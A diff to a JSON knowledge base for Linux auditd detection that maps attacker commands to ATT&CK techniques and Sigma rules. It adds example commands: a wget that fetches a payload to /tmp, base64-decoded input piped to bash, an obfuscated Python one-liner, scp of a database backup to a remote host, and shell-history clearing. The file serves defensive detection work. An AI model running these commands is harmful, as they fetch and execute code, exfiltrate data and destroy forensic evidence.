@@ -1,6 +1,6 @@
 {
   "platform": "linux-auditd",
-  "note": "Seed knowledge base. Detection references are representative of publicly available Sigma logic (SigmaHQ) and should be validated against your deployed ruleset. Telemetry assumes a Linux host with auditd and/or an EDR emitting process/network/file syscall events.",
+  "note": "Seed knowledge base. Detection references are representative of publicly available Sigma logic (SigmaHQ) and should be validated against your deployed ruleset. Telemetry assumes a Linux host with auditd and/or an EDR emitting process/network/file syscall events. An entry with no `detections` is deliberate: no published rule covers the action, and claiming one would be worse than claiming none. Find these with --coverage-gaps and generate a starter rule with --scaffold.",
   "entries": [
     {
       "id": "whoami",
@@ -83,7 +83,7 @@
       "description": "Network connection discovery",
       "techniques": [{ "id": "T1049", "name": "System Network Connections Discovery" }],
       "telemetry": ["execve() of netstat", "reads of /proc/net/*"],
-      "detections": [{ "source": "Sigma", "rule": "Network connection discovery utility (proc_creation_lnx)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "System Network Connections Discovery - Linux (proc_creation_lnx)", "confidence": "low" }],
       "noise": 40
     },
     {
@@ -92,7 +92,6 @@
       "description": "Socket / network connection discovery",
       "techniques": [{ "id": "T1049", "name": "System Network Connections Discovery" }],
       "telemetry": ["execve() of ss", "netlink socket enumeration"],
-      "detections": [{ "source": "Sigma", "rule": "Network connection discovery utility (proc_creation_lnx)", "confidence": "low" }],
       "noise": 40
     },
     {
@@ -116,10 +115,11 @@
     {
       "id": "arp",
       "match": { "program": "arp" },
+      "example": "arp -a",
       "description": "ARP cache enumeration — adjacent host discovery",
       "techniques": [{ "id": "T1018", "name": "Remote System Discovery" }],
       "telemetry": ["execve() of arp", "reads of /proc/net/arp"],
-      "detections": [{ "source": "Sigma", "rule": "Remote system discovery utility (proc_creation_lnx)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "Linux Remote System Discovery (proc_creation_lnx)", "confidence": "low" }],
       "noise": 40
     },
     {
@@ -137,7 +137,6 @@
       "description": "Scheduled task (cron) discovery",
       "techniques": [{ "id": "T1053.003", "name": "Scheduled Task/Job: Cron" }],
       "telemetry": ["execve() of crontab", "reads under /var/spool/cron"],
-      "detections": [{ "source": "Sigma", "rule": "Cron enumeration (proc_creation_lnx)", "confidence": "low" }],
       "noise": 40
     },
     {
@@ -164,10 +163,11 @@
     {
       "id": "wget",
       "match": { "program": "wget" },
+      "example": "wget -O /tmp/payload.sh http://198.51.100.20/payload.sh",
       "description": "Remote file download — tool ingress",
       "techniques": [{ "id": "T1105", "name": "Ingress Tool Transfer" }],
       "telemetry": ["execve() of wget", "outbound connect() to remote host", "file create() in cwd/tmp"],
-      "detections": [{ "source": "Sigma", "rule": "File download via wget (proc_creation_lnx / network)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Download File To Potentially Suspicious Directory Via Wget (proc_creation_lnx)", "confidence": "medium" }],
       "noise": 60
     },
     {
@@ -230,10 +230,11 @@
     {
       "id": "python-c",
       "match": { "program": "python3", "args": { "contains": "-c" } },
+      "example": "python3 -c 'import base64,os;os.system(base64.b64decode(\"aWQ=\").decode())'",
       "description": "Inline Python execution — common for one-liner payloads",
       "techniques": [{ "id": "T1059.006", "name": "Command and Scripting Interpreter: Python" }],
       "telemetry": ["execve() of python with -c", "child sockets/processes spawned from interpreter"],
-      "detections": [{ "source": "Sigma", "rule": "Inline Python one-liner execution (proc_creation_lnx)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Python One-Liners with Base64 Decoding - Linux (proc_creation_lnx); plain -c invocations are uncovered", "confidence": "medium" }],
       "noise": 55
     },
     {
@@ -247,11 +248,12 @@
     },
     {
       "id": "bash-history-tamper",
-      "match": { "line": { "contains": ".bash_history" } },
+      "match": { "line": { "any": [{ "contains": ".bash_history" }, { "contains": "history -c" }, { "contains": "history -w" }, { "contains": "export HISTFILESIZE=0" }, { "contains": "shopt -ou history" }] } },
+      "example": "history -c",
       "description": "Direct manipulation/removal of shell history file — anti-forensics",
       "techniques": [{ "id": "T1070.003", "name": "Indicator Removal: Clear Command History" }],
       "telemetry": ["unlink()/truncate() of ~/.bash_history — auditd file watch", "redirection of history to /dev/null"],
-      "detections": [{ "source": "Sigma", "rule": "Shell history file tampering (file_event_lnx)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Linux Command History Tampering (linux builtin)", "confidence": "high" }],
       "noise": 78
     },
     {
@@ -344,22 +346,24 @@
     {
       "id": "base64-decode",
       "match": { "program": "base64", "args": { "contains": "-d" } },
+      "example": "base64 -d payload.b64 | bash",
       "description": "Base64 decoding — deobfuscation of payloads",
       "techniques": [{ "id": "T1140", "name": "Deobfuscate/Decode Files or Information" }],
       "telemetry": ["execve() of base64 with -d", "often chained into a shell interpreter"],
-      "detections": [{ "source": "Sigma", "rule": "Base64 decode chained to execution (proc_creation_lnx)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Linux Base64 Encoded Pipe to Shell (proc_creation_lnx)", "confidence": "medium" }],
       "noise": 45
     },
     {
       "id": "scp",
       "match": { "program": "scp" },
+      "example": "scp -r /var/backups/db.tar.gz operator@10.0.0.5:/tmp/",
       "description": "File transfer over SSH — ingress or exfiltration",
       "techniques": [
         { "id": "T1105", "name": "Ingress Tool Transfer" },
         { "id": "T1048", "name": "Exfiltration Over Alternative Protocol" }
       ],
       "telemetry": ["execve() of scp", "outbound SSH connection connect() :22"],
-      "detections": [{ "source": "Sigma", "rule": "File transfer via scp (proc_creation_lnx / network)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "Remote File Copy (proc_creation_lnx)", "confidence": "low" }],
       "noise": 45
     },
     {
@@ -409,11 +413,11 @@
     },
     {
       "id": "sudoers-tamper",
-      "match": { "line": { "contains": "/etc/sudoers" }, "event": { "class": "file", "any": [{ "field": "TargetFilename", "eq": "/etc/sudoers" }, { "field": "TargetFilename", "path_under": "/etc/sudoers.d" }] } },
+      "match": { "line": { "contains": "/etc/sudoers" }, "event": { "class": "file", "any": [{ "field": "TargetFilename", "path_under": "/etc/sudoers.d" }, { "field": "TargetFilename", "eq": "/etc/sudoers" }] } },
       "description": "Reading or modifying /etc/sudoers — privilege escalation / persistence",
       "techniques": [{ "id": "T1548.003", "name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching" }],
       "telemetry": ["openat()/write() of /etc/sudoers or /etc/sudoers.d/* — high-signal auditd file watch"],
-      "detections": [{ "source": "Sigma", "rule": "Sudoers file modification (file_event_lnx)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Persistence Via Sudoers.d Files (file_event_lnx)", "confidence": "high" }],
       "noise": 72
     },
     {
@@ -464,7 +468,6 @@
         { "id": "T1567", "name": "Exfiltration Over Web Service" }
       ],
       "telemetry": ["execve() of python -m http.server", "listening socket bind()/listen() on a high port"],
-      "detections": [{ "source": "Sigma", "rule": "Python http.server execution (proc_creation_lnx)", "confidence": "medium" }],
       "noise": 55
     },
     {
@@ -588,9 +591,12 @@
       "id": "login-discovery",
       "match": { "program": "last" },
       "description": "Login history enumeration",
-      "techniques": [{ "id": "T1087.001", "name": "Account Discovery: Local Account" }],
+      "techniques": [
+        { "id": "T1087.001", "name": "Account Discovery: Local Account" },
+        { "id": "T1049", "name": "System Network Connections Discovery" }
+      ],
       "telemetry": ["execve() of last", "read of /var/log/wtmp"],
-      "detections": [{ "source": "Sigma", "rule": "Login history discovery (proc_creation_lnx)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "System Network Connections Discovery - Linux (proc_creation_lnx)", "confidence": "low" }],
       "noise": 30
     },
     {
@@ -611,7 +617,6 @@
       "description": "Modifying user group membership — privilege escalation / account manipulation",
       "techniques": [{ "id": "T1098", "name": "Account Manipulation" }],
       "telemetry": ["execve() of usermod", "writes to /etc/group,/etc/passwd — auditd file watch"],
-      "detections": [{ "source": "Sigma", "rule": "User account/group modification (proc_creation_lnx)", "confidence": "medium" }],
       "noise": 60
     },
     {
